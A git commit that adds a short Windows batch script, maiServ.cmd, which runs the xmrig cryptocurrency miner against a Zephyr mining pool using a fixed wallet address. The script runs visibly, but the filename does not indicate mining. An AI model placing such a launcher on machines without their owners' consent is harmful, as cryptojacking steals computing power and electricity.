e7770a5398aba25a486d5a1d05dc87ef94e4fe3a
2572171 <155726880+2572171@users.noreply.github.com>
2024-01-08 13:14:24 +0300

    Add files via upload

---
+++ maiServ.cmd
@@ -0,0 +1,3 @@
+@echo off
+xmrig.exe --donate-level 1 -o de.zephyr.herominers.com:1123 -u ZEPHYR3EFqwK5KG1UNbrx9S3F4RBAUSiMTFMmh7P8sJeFnNnY3eidKJ8jTY3di8QjdVidnmeiZBykQVXtcg3bV2pEzTy2muiNiK3q -p YOUR_WORKER_NAME -a rx/0 -k 
+pause
